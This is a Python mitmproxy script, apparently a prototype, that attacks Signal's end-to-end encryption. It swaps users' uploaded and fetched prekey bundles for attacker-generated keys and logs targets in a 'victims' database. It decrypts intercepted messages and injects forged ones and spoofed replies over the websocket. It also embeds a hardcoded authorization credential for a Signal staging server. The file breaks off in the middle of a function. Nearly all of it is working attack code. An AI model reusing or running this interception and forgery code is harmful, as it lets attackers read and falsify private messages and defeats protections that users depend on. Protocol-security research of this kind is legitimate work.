import subprocess
import os
import json
import requests
import random
from mitmproxy import flow, http, ctx
import sqlite3
from setup import setup_db
import base64
import re
from proto_python.wire_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python.storage_pb2 import *
from proto_python.WebSocketResources_pb2 import *
from proto_python.SignalService_pb2 import *
from proto_python import *
from test_protocol_wip import *

protocol_runs = dict()
once = False

def try_run_sudo(cmd):
    try_run(f"sudo {cmd}")

def try_except(success, failure, *exceptions):
    try:
        return success()
    except exceptions or Exception:
        return failure() if callable(failure) else failure
    
def try_run(cmd: str):
    try:
        res = subprocess.run(cmd, shell=True, check=True, stdout=open(os.devnull, "wb"))
        # print(res.returncode)
    except subprocess.CalledProcessError as e:
        print(f"cmd fucked: {e}\n{cmd}")


def fake_key_gen(preKeysId=1, signedKeyId=1):
    try_run("node ./node-signal/index.js")

    p = subprocess.Popen(
        ["node", "./node-signal/index.js", "100"], stdout=subprocess.PIPE
    )
    out = p.stdout.read()

    keys = json.loads(out)

    identity_key = {"privateKey":keys["identityKey"]["privateKey"], "publicKey":keys["identityKey"]["publicKey"]}
    signedPre_key = (
        keys["signedPreKey"]["privateKey"],
        keys["signedPreKey"]["publicKey"],
        keys["signedPreKey"]["signature"],
    )

    preKeys = [(i["privKey"], i["pubKey"]) for i in keys["preKeys"]]

    #print(identity_key, signedPre_key, preKeys)

    fake_keys = {
        "identityKey": identity_key,
        "preKeys": [
            {"keyId": preKeysId + id, "publicKey": keyPair[1], "privateKey": keyPair[0]}
            for id, keyPair in enumerate(preKeys)
        ],
        "signedPreKey": {
            "keyId": signedKeyId,
            "publicKey": signedPre_key[1],
            "privateKey": signedPre_key [0],
            "signature": signedPre_key[2],
        },
    }

    # fake_keys_json = json.dumps(fake_keys, indent=4)
    one_time_keys = fake_keys

    # one_time_keys.pop("signedPreKey")
    # one_time_keys["identityKey"] = "Bd+PfqCkOUocwUguUiW5zCdj2/wg2hD0vN97YYk1KPwD"
    # one_time_keys.pop("identityKey")

    headers = {
        "Authorization": "Basic ZTdkNzFhZWEtYzQxYS00ZDg4LTg1NmItMDJlOTc5OTg4NjNhOjRvd1dGeGRGR2FqeXFPOHJrUTFmTUJkVA==",
        "X-Signal-Agent": "OWA",
        "User-Agent": "Signal-Android/6.18.4 Android/31",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "chat.staging.signal.org",
        "Connection": "Keep-Alive",
    }

    # payload = "{\"identityKey\":\"BYW63VEybfR3OF9Pt0qu2+AQ0EF5TikTcfiM/GsxnMph\",\"preKeys\":[{\"keyId\":4223788,\"publicKey\":\"BTxkj8O9E75onyVN7Alj1lqv9ihg0rbD0XxoI21d5VdT\"},{\"keyId\":4223789,\"publicKey\":\"BeEOaXf93mC00vMu7ghPTXY6+IWCqfG5BDID6+tm3g9d\"},{\"keyId\":4223790,\"publicKey\":\"BTbbK5IzN1t6dxQZDSbHwcCHG1cEfkdGUzQsW0yHBcUo\"},{\"keyId\":4223791,\"publicKey\":\"BafRMu+ybG22YNwVxRqDh20Yj6jmToQrV3sEEHm4li5Y\"},{\"keyId\":4223792,\"publicKey\":\"BYTBjL45f3UR2LDTHmICfkJbZ93LU//4M+3qoyc7Xl4+\"},{\"keyId\":4223793,\"publicKey\":\"BSPbHM3khhX841YfRNv8prq/2Vz8WuxJo08dC3SP9+Zi\"},{\"keyId\":4223794,\"publicKey\":\"BR6uHJwgYhgWUv6O3H2RWLVTqHP9bSN8IZxAyafhUZps\"},{\"keyId\":4223795,\"publicKey\":\"Bdr4tg2J20MqM/wruk9Gd7wR+McPWOHA7haiY/1ZX8wK\"},{\"keyId\":4223796,\"publicKey\":\"Bd0UnS9EIKaa/3Ouwxipw2KkkaYSHjUqgUByaG5Za1QY\"},{\"keyId\":4223797,\"publicKey\":\"BUNaikgIHgzQgq8DxPVy5X4lamqebdbl6MORgYRMuyM4\"},{\"keyId\":4223798,\"publicKey\":\"Bc2waMV7NIxU4skn/2naMt5Cizw5DpV3z623uu2nP01o\"},{\"keyId\":4223799,\"publicKey\":\"BRGGprJt3+tGNT6mirjx2dABeXgn1AgIRY2TCC5RfABH\"},{\"keyId\":4223800,\"publicKey\":\"BaYW/6O41i+4udh/mX7S3XWVFs/pcmKf997rVvLU5mBM\"},{\"keyId\":4223801,\"publicKey\":\"BbOmQlgSUnJ0ffsAE27Bm2kEnjcFMfDQG+b0023mcJN5\"},{\"keyId\":4223802,\"publicKey\":\"BXTs48ekQ0GD8kCqBj8dvU3fUCJkk4Zsedcxx/Wh/ptl\"},{\"keyId\":4223803,\"publicKey\":\"BSDc9ft1ChyGie98nWiuLLdqZDKGrFbtXIuyWre4Pupo\"},{\"keyId\":4223804,\"publicKey\":\"BbE6c82KOvQeGaodx1yeKVCdBfN006sqWickTAdMJoJ1\"},{\"keyId\":4223805,\"publicKey\":\"BU0hJrjpybEIUbcdoatN64g1tCpUGAznTBfQScZs215O\"},{\"keyId\":4223806,\"publicKey\":\"BcrPMPFmsxaJo0/ZZU2VzKXlcb137RVXAW5ONdYdMncx\"},{\"keyId\":4223807,\"publicKey\":\"BazXXMbHC/zb+qg6pjpVuDEoGFrZ8I/TXagE0RjeIXd4\"},{\"keyId\":4223808,\"publicKey\":\"Bep6f8b5kKjHNErOj9F0mmAhSb7iZSMfMLZ/jOnOE6QK\"},{\"keyId\":4223809,\"publicKey\":\"BcNrRGVaXMsWYM9g2IbViXxidgWcUK9x6OlCcGsYtNkI\"},{\"keyId\":4223810,\"publicKey\":\"BSY6aXBSUG0wv3zX0OysC4xGjD8PpYLnOY6scieKGkdb\"},{\"keyId\":4223811,\"publicKey\":\"BdxgldLF9r0QLJS8lvhOxJd401DiyNTIQASMMU6732on\"},{\"keyId\":4223812,\"publicKey\":\"BUeT1VBdQAZBaC4JIdhvPZBxmXRYMzD78YG8WBabQRBt\"},{\"keyId\":4223813,\"publicKey\":\"BdyK1eT5YKtjUxQa+b08ocutmuCQHgPIVEZTvDgezRQn\"},{\"keyId\":4223814,\"publicKey\":\"Bfa3B77KmirilzcWAAStkhNAmwROynKOrDTGM2pjm1cs\"},{\"keyId\":4223815,\"publicKey\":\"Bb19Sj2gCLUdckNsifuaQjctHPXRQCFWrXZRquddVjB8\"},{\"keyId\":4223816,\"publicKey\":\"BdkFs0pcr5u/c5sSrRuGDhhRCdSNVa+qeMg307jSF5NS\"},{\"keyId\":4223817,\"publicKey\":\"BQXfvvXyQehMelLUF3IKjvDUzBzf9x1oqsMe6ckSQhg2\"},{\"keyId\":4223818,\"publicKey\":\"BWEZGBl8rO6/ZoapgQym5mSYC6B0aTH4wo7NADWXNHgz\"},{\"keyId\":4223819,\"publicKey\":\"BcHNwL10wtGu5Fp/VlDfr/qEMAwSwwpfs8Vj4Yn1QY50\"},{\"keyId\":4223820,\"publicKey\":\"Bfwy2axR1Pr9pn4h2m5MqlZoZztagcM8DBo/o5W8uCtu\"},{\"keyId\":4223821,\"publicKey\":\"Bf86WRf08jtadf/KTC+eT6DilV1N38Zc9z79WskrMMwi\"},{\"keyId\":4223822,\"publicKey\":\"BVRCIy38Zc3rPF/FYDayFfdSCEF8lD7S3SfK4bgDWadh\"},{\"keyId\":4223823,\"publicKey\":\"Bclx0TJ+Tw98+0ZJ8zoy2u5LLiUv0hTTf6AZO02ZqW0T\"},{\"keyId\":4223824,\"publicKey\":\"BU3QuG8GR0zGEcYAaY2fXtTi8DI8mWLStc2ol/vrNyIP\"},{\"keyId\":4223825,\"publicKey\":\"BRmXIRbDHmEtdiCm0xZd9leDzYiUFWqD8Y8L06ijGZc1\"},{\"keyId\":4223826,\"publicKey\":\"BX7JH8xzNttEBkEtfpeqh9+smk9rgvTlKF+yyIDU9R50\"},{\"keyId\":4223827,\"publicKey\":\"BVpWe8XXgpC7jT5qwbQdMoDtuNFqVgHE7q5tesvh+yQC\"},{\"keyId\":4223828,\"publicKey\":\"BbDsl915p9f/2nopspgGKPPYKDnBungMeYuVdQegdYh4\"},{\"keyId\":4223829,\"publicKey\":\"BWqiu3VV+POesQKz8GXt4FRZCeG4myPJtgw+8XRLHFAf\"},{\"keyId\":4223830,\"publicKey\":\"BcAaTP62gpAajqmUdnKYL0e2aLjXg/SYri9IyhhPcuMw\"},{\"keyId\":4223831,\"publicKey\":\"BbaFiZeddKvLkFYqikIUKZItZCLbaMnXKn/yVifLimQe\"},{\"keyId\":4223832,\"publicKey\":\"BWOO6KG3FSQQ5UDD12K1HOWhfZXMAFi7PoBgPJEzDtok\"},{\"keyId\":4223833,\"publicKey\":\"BSjZYPvM8rer7ISrou2DxAt1JlYmp43CmzcnQkXjSHws\"},{\"keyId\":4223834,\"publicKey\":\"BbH3k9kQbjtUf8Igpag71vrjI4BuCHWf6vsI31XNfE0U\"},{\"keyId\":4223835,\"publicKey\":\"BbcRABG4ri9DlFzZg/fiZxFnWfdjM4Uly4D0FtoXxuNE\"},{\"keyId\":4223836,\"publicKey\":\"BTDMqLiwvIDkUYz0yrIRSs+GiR14WM72owE1hdQ0l2s/\"},{\"keyId\":4223837,\"publicKey\":\"Beo7A2rvZiuvyiQgCeF2AOhBc3zWlt9w7gg5qcGrCzVo\"},{\"keyId\":4223838,\"publicKey\":\"BZBjvuXrcXScPCX9ePTKYrtX+/vll2TRY+FfYF8o4YYY\"},{\"keyId\":4223839,\"publicKey\":\"BecHWQ3t/j4Iu+iveciiiJKbwAQBwYWPFQzUSfW0bOY3\"},{\"keyId\":4223840,\"publicKey\":\"BeR7/jNoPdOUA3C2qTbs+pK9iE2fQGU4WYDlEreU/too\"},{\"keyId\":4223841,\"publicKey\":\"BXpebk3vdefPsTFK0HCLQ+LW6JbYzUz51g2dMZByT0QM\"},{\"keyId\":4223842,\"publicKey\":\"BbpKS/bteFfTw8EWbq+VKGvhR3aqo0giV/Hsy/DeerlP\"},{\"keyId\":4223843,\"publicKey\":\"Bfy4P3bDPSJMEGSPiWY+OvKmSBezKLuEPGgxdsSNk41U\"},{\"keyId\":4223844,\"publicKey\":\"BclYNSwMOL2Nt/0R79bmF66rhsPBRy03S7aCz1R9yQUh\"},{\"keyId\":4223845,\"publicKey\":\"BRPdgzAtJPB1qnVcBG0wJcla8LXtpPBu9LvRHAfpHLUw\"},{\"keyId\":4223846,\"publicKey\":\"BQyITv+bPYir6WZl3aLCICwVyM2cVVV8s4IsRxq+SnFl\"},{\"keyId\":4223847,\"publicKey\":\"BXmLxf7cbtx192Xqaq6mKt82rwkB/ZNExDTZ8b2Ubk1f\"},{\"keyId\":4223848,\"publicKey\":\"BT26cJXPXbyEI87fUWfEBUVTSo5LXGKGqPJIvPdpRSwu\"},{\"keyId\":4223849,\"publicKey\":\"BZIrcefrxQWNgmjmHn0UeWhzRx4JmH8ZJA6jsSBt6lsw\"},{\"keyId\":4223850,\"publicKey\":\"Bb0zU7VkwLrbETBKs+6xQeUCP2WmAIButyYo2PEYxyRh\"},{\"keyId\":4223851,\"publicKey\":\"Bcg1XWZ6VP86JEU895xHWvz2Iag/1PSGfNZUHJq+ITA1\"},{\"keyId\":4223852,\"publicKey\":\"BTVcAG1fjGLN8yZtWhaYp8L4ECXwK1Go68NlCUBb/0Nd\"},{\"keyId\":4223853,\"publicKey\":\"BRkfVj0bKsgML8UCdoBpJVdMfv9LgiaNEheXMxDtuyR4\"},{\"keyId\":4223854,\"publicKey\":\"BaMf/PBXCHZ2Kfb7OBZ3Oar2fuHImSH69dukskrlF9EV\"},{\"keyId\":4223855,\"publicKey\":\"BfGeaVKqvmXc69bda2xv5God5+KUxTK8Qx355l1aF3d2\"},{\"keyId\":4223856,\"publicKey\":\"BS4jIm1wWHaqYjUQXeLv+l2Obk6bZZVzvnwd9w6Io15w\"},{\"keyId\":4223857,\"publicKey\":\"BZ2aCMs+3/uN+rJUZ2H/MJOKoa5o5k6Vi1cXx0TGtxxp\"},{\"keyId\":4223858,\"publicKey\":\"BeVYjnfXlCaXnHqBVdU6OVGvR8PndJL0R8sGriMhqzlH\"},{\"keyId\":4223859,\"publicKey\":\"BYmwDPeCn2sUXagxtV+EnX41FxvptLki/mWBQ4wOPZAw\"},{\"keyId\":4223860,\"publicKey\":\"BTUj+QzZO41A7wXPafQoSDXmOqgDQvABpplDZclotOEK\"},{\"keyId\":4223861,\"publicKey\":\"BXVKk1bhfPKuqCiwro4ulSm4PZpeUuVhzOBkdfEzGkgM\"},{\"keyId\":4223862,\"publicKey\":\"BQ4njOyWmmA45p5E+p/yyY2nJtCfHvjfY31QsmVzqSRw\"},{\"keyId\":4223863,\"publicKey\":\"BcEYq3xsMFMEr4qghliI5rOssHj1X8b7P3ahuIsOZUMu\"},{\"keyId\":4223864,\"publicKey\":\"Bd0Lo1u/yNzjvGO00iEKVWfk7LZVuyX9UKbSXd4gVKYT\"},{\"keyId\":4223865,\"publicKey\":\"BdW3L3Jm6ju4iQCyRjtRKF4BEku4NiAiCw5BdaIGqb0L\"},{\"keyId\":4223866,\"publicKey\":\"Be56oMADeZWqbG63M5jtzudtEZJiwD3IoUKz99NPznpv\"},{\"keyId\":4223867,\"publicKey\":\"BUCWBLS97LfKX00rkB2JvFW8VE96IjO1eKwkhhpvj+s7\"},{\"keyId\":4223868,\"publicKey\":\"BbgvqM/ooi5eagrAPc0Pd2WDNAeHndN7s5ZTUwACwLIo\"},{\"keyId\":4223869,\"publicKey\":\"BSQUp712BR2r3/fDK24pVsd1TJ3WDS5yCZwL4Wlpizkq\"},{\"keyId\":4223870,\"publicKey\":\"Bdas/J50WNARB15P0YenV1KlU6eOPJ6wqLEFUSjzDg0A\"},{\"keyId\":4223871,\"publicKey\":\"BRQD3ybEl1kph0MSU15cC6QkbsOM2IO/1yUddQUTlEQv\"},{\"keyId\":4223872,\"publicKey\":\"BRmk5imYw2NRZRbv7O67I4/Gsqij80is4TT/PUDNgFhF\"},{\"keyId\":4223873,\"publicKey\":\"BWnDBzzg8Ij9VBvK0MYD37z8wy1aoU7I12RvunTuGwti\"},{\"keyId\":4223874,\"publicKey\":\"Bcdh2XDVtUSGHjmTqp6RMR8ewROQT/cbpEE+zQPeIYgd\"},{\"keyId\":4223875,\"publicKey\":\"BVhhjRjHJhPhTb3/MElbb/lJ2ZMvqa+jbSbS32u2iAJK\"},{\"keyId\":4223876,\"publicKey\":\"BURwrn+bQstWrjuON437gY6yLM1MNYziIRiZ811ml6ti\"},{\"keyId\":4223877,\"publicKey\":\"BSULOncxOsKKQz43hBYetM9gC9Tul2+I51b0W7ftCKd1\"},{\"keyId\":4223878,\"publicKey\":\"BRemWKcSr3qHApz9mbEn4RJEQ++Dul4YsSo/9XSVqrx0\"},{\"keyId\":4223879,\"publicKey\":\"BUN7Bc0q74qy9lp4Ssv70or3KDUFWJylCaJywOz9COxW\"},{\"keyId\":4223880,\"publicKey\":\"Bdbq4XuL/tWmytSuG9tip2uaqlAyC1qBhUgZFiJPOOpg\"},{\"keyId\":4223881,\"publicKey\":\"BfQgGR1HECwz3KrMSP0HQGMD95tCkCp3EUVw6tZTu5hG\"},{\"keyId\":4223882,\"publicKey\":\"BUi8/4cCwXIRQ4bqDET09rKQebDLIXb0H4tG/bzN1JRj\"},{\"keyId\":4223883,\"publicKey\":\"BT64fcmjnWo4H8KILsk98uKPcgprayxxKOxy17TlOv80\"},{\"keyId\":4223884,\"publicKey\":\"BZb7crWBF4R21LZRiUntkwVr7FcnVbjKtYMtpCgwnlIl\"},{\"keyId\":4223885,\"publicKey\":\"BQ5C/flbzl5XqXuQXI6yOTb/QN+Pb56oTh6Bt5Ih88Br\"},{\"keyId\":4223886,\"publicKey\":\"BQN4eVpD43Hgf9d0SzJnr2m0HAupXSj8yjMLOTqJwTdK\"},{\"keyId\":4223887,\"publicKey\":\"BU6kFwE+PCWkHv9X7/2y/RTAC3V2I70RRbVVYjbyiiMb\"}],\"signedPreKey\":{\"keyId\":6631071,\"publicKey\":\"BfpjOb1uZNWyrFkMJsm0igQQrtNm4mF+vlzxzirvY84D\",\"signature\":\"yH4Za2CmH73YSGwTzVu0bxqkLjaIMVP5kKP2kP5KcOpJkBtZ2zncA8CaFQ0dRk8ZUovdrop4GnPaUlFojFhrDA\"}}"
    # fake_keys_json = re.sub("(\w+):", r'"\1":',  fake_keys_json.dumps())
    # resp = requests.put(url="https://chat.staging.signal.org/v2/keys/?identity=aci", data= json.dumps(fake_keys_json), headers=headers)
    # print(resp.ok,resp.status_code,resp.content)
    return fake_keys


def isKnownUser(cur: sqlite3.Cursor, target: str) -> bool:
    query = f"SELECT * FROM victims WHERE pNumber = ? OR aci = ? ;"
    params = (target, target)
    result = cur.execute(query, params).fetchall()
    return len(result) > 0


def request(flow: http.HTTPFlow):
    conn = sqlite3.connect("mitm.db")
    cur = conn.cursor()

    # before checking the request, let's see if we know this bastard
    bearer = flow.request.headers.get("Authorization", None)
    knownUser, target = False, ""
    if bearer is not None:
        bearer = bearer.split("Basic ")[1]
        # base64.decode(bearer)
        target = base64.b64decode(bearer).split(b":")[0].decode()
        # sql query to check if target in aci or pnumber
        knownUser = isKnownUser(cur, target)
        # ctx.log(f"Bearer token: {bearer} (known: {knownUser})")
        # ctx.log(target)

    if "/v2/keys/" in flow.request.path and flow.request.method == "PUT":
        # make it a method, for example (replace_keys())
        if not knownUser:
            # well... nothing to do here,
            pass
        keys = {}
        try:
            keys = json.loads(flow.request.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.request.content.decode()}")
        ts = flow.timestamp_created
        identity = flow.request.query.get("identity")
        with open(f"saved/{ts}-{identity}-keys.json", "w") as f:
            f.write(json.dumps(keys))

        # pNumber, aci, pni = info["number"], info["uuid"], info["pni"]

        IdenKey, SignedPreKey, PreKeys = (
            json.dumps(keys["identityKey"]),
            json.dumps(keys["signedPreKey"]),
            json.dumps(keys["preKeys"]),
        )

        fake_keys = fake_key_gen(
            signedKeyId=keys["signedPreKey"]["keyId"],
            preKeysId=keys["preKeys"][0]["keyId"],
        )
        ctx.log.warn(fake_keys)
                
        fake_IdenKeyDict, fake_SignedPreKeyDict, fake_PreKeysDict = (
            (fake_keys["identityKey"]),
            (fake_keys["signedPreKey"]),
            (fake_keys["preKeys"]),
        )
        
        fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
            json.dumps(fake_keys["identityKey"]),
            json.dumps(fake_keys["signedPreKey"]),
            json.dumps(fake_keys["preKeys"]),
        )
        ctx.log.alert((fake_IdenKey, fake_SignedPreKey, fake_PreKeys))

        query = f"UPDATE victims SET {identity}IdenKey = ?, {identity}SignedPreKey = ?, {identity}PreKeys = ?, {identity}FakeIdenKey = ?, {identity}FakeSignedPreKey = ?, {identity}FakePreKeys = ? WHERE pNumber = ? OR aci = ?"
        params = (
            IdenKey,
            SignedPreKey,
            PreKeys,
            fake_IdenKey,
            fake_SignedPreKey,
            fake_PreKeys,
            target,
            target,
        )

        cur.execute(query, params)

        conn.commit()
        ctx.log.info(f"Updated {identity} keys for target {target}")
        # keys["preKeys"] = fa["preKeys"]
        fake_keys["identityKey"] = fake_keys["identityKey"]["publicKey"]
        del fake_keys["signedPreKey"]["privateKey"]
        for i in range(len(fake_keys)):
            del fake_keys["preKeys"][i]["privateKey"]
        flow.request.content = json.dumps(fake_keys).encode()
        with open(f"saved/fake-{ts}-{identity}-keys.json", "wb") as f:
            f.write(flow.request.content)


def response(flow: http.HTTPFlow):
    conn = sqlite3.connect("mitm.db")
    cur = conn.cursor()

    # before checking the request, let's see if we know this bastard
    bearer = flow.request.headers.get("Authorization", None)

    knownUser, target = False, ""
    if bearer is not None:
        bearer = bearer.split("Basic ")[1]
        # base64.decode(bearer)
        target = base64.b64decode(bearer).split(b":")[0].decode()
        # sql query to check if target in aci or pnumber
        knownUser = isKnownUser(cur, target)

    if "/v1/registration" in flow.request.path and flow.request.method == "POST":
        try:
            resp = json.loads(flow.response.content)
            req = json.loads(flow.request.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
        with open("resp.json", "w") as f:
            f.write(json.dumps(resp))

        conn = sqlite3.connect("mitm.db")
        cur = conn.cursor()
        try:
            pNumber, aci, pni, unidentifiedAccessKey = (
                resp["number"],
                resp["uuid"],
                resp["pni"],
                req["accountAttributes"]["unidentifiedAccessKey"],
            )
            cur.execute(
                f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""",
                (pNumber, aci, pni, unidentifiedAccessKey),
            )
            conn.commit()
        except Exception:
            pass

    matches = re.match("\/v2\/keys\/([\w+-]+)\/(\*|\d)", flow.request.path)
    if matches and flow.request.method == "GET":
        ctx.log.warn("Before GET request")
        groups = matches.groups()
        # ctx.log(f"regex matched: {groups}")
        if len(groups) != 2:
            ctx.log.error("sth is fucked")
        receiver, deviceID = groups[0], groups[1] if groups[1] != "*" else None
        
        try:
            info = json.loads(flow.response.content)
        except Exception as e:
            ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")

        # fake_keys = fake_key_gen(preKeysId=info['devices'])
        # fake_IdenKey, fake_SignedPreKey, fake_PreKeys = fake_keys["identityKey"], json.dumps(fake_keys["signedPreKey"]), json.dumps(fake_keys["preKeys"])

        ctx.log.alert((target))
        if target is None or target == "":
            bearer = flow.request.headers.get("Unidentified-Access-Key", None)
            #ctx.log.alert(bearer)
            res = cur.execute(
                "SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,)
            )
            #target = res.fetchone()[0]
        ctx.log.warn(flow.response.content)

        devices=None
        try :
            devices = info["devices"]
        except:
            ctx.log.debug("No info about devices")
            return
        
        for i, device in enumerate(devices):
            # ctx.log(params)
            fake_keys = fake_key_gen(
                preKeysId=device["preKey"]["keyId"],
                signedKeyId=device["signedPreKey"]["keyId"],
            )
            fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
                json.dumps(fake_keys["identityKey"]),
                json.dumps(fake_keys["signedPreKey"]),
                json.dumps(fake_keys["preKeys"]),
            )
            params = (
                device["deviceId"],
                target,
                receiver,
                json.dumps(info["identityKey"]),
                json.dumps(device["signedPreKey"]),
                json.dumps(device["preKey"]),
                fake_IdenKey,
                fake_SignedPreKey,
                fake_PreKeys,
            )

            cur.execute(
                f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeIdenKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE (recv_aci = ? AND deviceId = ?)",
                params + (receiver, device["deviceId"],),
            )
            cur.execute(
                "INSERT OR IGNORE INTO end2end (deviceId, v_aci, recv_aci, recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey) VALUES (?,?,?,?,?,?,?,?,?)",
                params,
            )
            # res = cur.execute("SELECT * from end2end")
            # ctx.log(res.fetchall())
            conn.commit()
            
            info['devices'][i]['signedPreKey']['publicKey'] = json.loads(fake_SignedPreKey)["publicKey"]
            info['devices'][i]['signedPreKey']['signature'] = json.loads(fake_SignedPreKey)["signature"]
            fake_PreKeys = json.loads(fake_PreKeys)
            keyId = info['devices'][i]['preKey']['keyId']
            ctx.log.error(info['devices'])
            info['devices'][i]['preKey']['publicKey'] = fake_PreKeys[0]['publicKey']
            info['identityKey'] = json.loads(fake_IdenKey)['publicKey']
        ctx.log.warn(info)
        flow.response.set_content(bytes(json.dumps(info),'utf-8'))

def websocket_message(flow: http.HTTPFlow):
    cont = flow.websocket.messages
    conn = sqlite3.connect("mitm.db")
    cur  = conn.cursor()
    msg = b''
    once = False
    ctx.log(f"cont len {len(cont)}")

    # for messages in cont:
    messages = cont[-1]
    ctx.log(f"websocket mess {messages}")
    if True:
        #ctx.log.warn(messages)
        ctx.log(messages.content)
        pattern = b"/v1/messages"   
        proto_msg = WebSocketMessage()

        if pattern in messages.content:
            ctx.log.alert("you found it")
            sourceUUid = flow.request.path.split("login=")[1].split("&")[0]
            proto_msg.ParseFromString(messages.content)
            ctx.log.alert(proto_msg)
            ctx.log.warn(f"diocane {proto_msg}")
            ctx.log.warn(type(proto_msg.request.body))
            body = json.loads(proto_msg.request.body)
            #ctx.log.warn(body)
            
            ##### Protocol Run?
            recv = body['destination']
            
            # check if protocol is available
            msg_type = body['messages'][0]['type'] #check out for creating instances of protocol
            
            if (msg_type == 3 and messages.injected == False):
                messages.drop()
            ### try to x3dh if contact never seen before
                #aliceToMitm = {}.fromkeys(["recv_IdenKey", "recv_SignedPreKey", "recv_PreKey", "recv_FakeIdenKey", "recv_FakeSignedPreKey", "recv_FakePreKey"])
                aliceToMitmKeys = cur.execute(f"SELECT recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey FROM end2end WHERE recv_aci = ? AND deviceId = 1;", (recv,)).fetchone()
                ctx.log.warn((aliceToMitmKeys))
                #ctx.log.warn((aliceToMitmKeys[0], aliceToMitmKeys[1], aliceToMitmKeys[2]['publicKey']))
            
                mitmToBobKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
                #ctx.log.warn(mitmToBobKeys)
                #result = cur.execute(query, params).fetchall()
                mitmAIK, mitmASPK, mitmOTK = json.loads(aliceToMitmKeys[3])["privateKey"], json.loads(aliceToMitmKeys[4])["privateKey"],json.loads(aliceToMitmKeys[5])
                mitmBIK, mitmBSPK, mitmBOTK = json.loads(mitmToBobKeys[3])["privateKey"], json.loads(mitmToBobKeys[4])["privateKey"],json.loads(mitmToBobKeys[5])
                bobIK, bobSPK, bobOTK = json.loads(aliceToMitmKeys[0]), json.loads(aliceToMitmKeys[1])["publicKey"],json.loads(aliceToMitmKeys[2])["publicKey"]

                mitmA = Bob(privIK = hex2PrivKey(base64.b64decode(mitmAIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmASPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmOTK[0]['privateKey']).hex()))
                #mitmB = Alice(IK = hex2PrivKey(base64.b64decode(mitmBIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmBSPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmBOTK[0]['privateKey']).hex()))
                mitmB = Alice(IK = hex2PrivKey(base64.b64decode(mitmBIK).hex()))

                bob = Bob(pubIK = hex2PubKey(base64.b64decode(bobIK).hex()), pubSPK = hex2PubKey(base64.b64decode(bobSPK).hex()), pubOPK = hex2PubKey(base64.b64decode(bobOTK).hex()))
                bob_bundle = KeyBundle(IK=bob.pubIK, SPK=bob.pubSPK, OPK=bob.pubOPK) ###check db, if they are the right keys
                ctx.log.error((PubKey2Hex(bob_bundle.IK), PubKey2Hex(bob_bundle.SPK), PubKey2Hex(bob_bundle.OPK), PrivKey2Hex(mitmB.IK)))
                
                EncodedMessage = body['messages'][0]['content']
                ctx.log.warn(f'Encoded Message {EncodedMessage}')
                ctx.log.warn(EncodedMessage)
                atm = AliceToMitm(bob = mitmA)
                dec_msg = atm.BobReceive(EncodedMessage)
                ctx.log.error(f"decrypted message {dec_msg}")

                ############# COMPLETE HERE Mitm send to Bob
                #mitmB.x3dh(bob_bundle)
                mitmToBob = MitmToBob(alice = mitmB, bob = bob)
                mitmToBob.handshake(bob_bundle) ### check if handshake sk is the same
                msg_to_bob = mitmToBob.AliceSendPreKeySignalMessage(b"hey bob, you are dumb", EncodedMessage) ### check correctness of the message
                ctx.log.error(f"msg to bob {base64.b64encode(msg_to_bob).decode('ASCII')}")
                pksmToBob = WebSocketMessage()

                pksmToBob.CopyFrom(proto_msg)
                pksmToBobBody = json.loads(pksmToBob.request.body)
                pksmToBobBody['messages'] = [pksmToBobBody['messages'][0]]
                pksmToBobBody['messages'][0]['content'] = base64.b64encode(msg_to_bob).decode('ASCII')
                serialized = json.dumps(pksmToBobBody, separators=(',', ':'))
                pksmToBob.request.body = bytes(serialized, 'utf-8')
                wire_pksmToBob = pksmToBob.SerializeToString()
                ctx.log.warn(f"to Bob {wire_pksmToBob.hex()}")
                if not once:
                    ctx.master.commands.call("inject.websocket",
                                            flow,
                                            False,
                                            wire_pksmToBob,
                                            False)
                    
                    
                #### BOB replies MITM         
                    
                msg = atm.BobSend(b"Thank you very much, I will take care!", b'bob profile key')
                response = WebSocketMessage()
                response.CopyFrom(proto_msg)

                response.request.verb = "PUT"
                response.request.path = "/api/v1/message"
                seed = current_milli_time()
                response.request.id = abs(nextLong(seed))
                response.request.headers.append(f"content-type:application/json")
                response.request.headers.append(f"X-Signal-Key: false")
                response.request.headers.append(f"X-Signal-Timestamp: {current_milli_time()}")
                responseEnvelope = Envelope()
                responseEnvelope.type = 1
                responseEnvelope.timestamp = current_milli_time()
                responseEnvelope.serverGuid = "ef5d1433-c2df-4aeb-9863-5b88666f659b"
                responseEnvelope.sourceUuid = recv
                responseEnvelope.sourceDevice = 1
                responseEnvelope.serverTimestamp = current_milli_time()
                responseEnvelope.destinationUuid = sourceUUid
                responseEnvelope.urgent = True
                responseEnvelope.story = False
                responseEnvelope.content = msg # base64.b64decode(msg)
                ctx.log.warn(f"msg { msg.hex()}")
                
                response.request.body = responseEnvelope.SerializeToString()
                
                ack = WebSocketMessage()
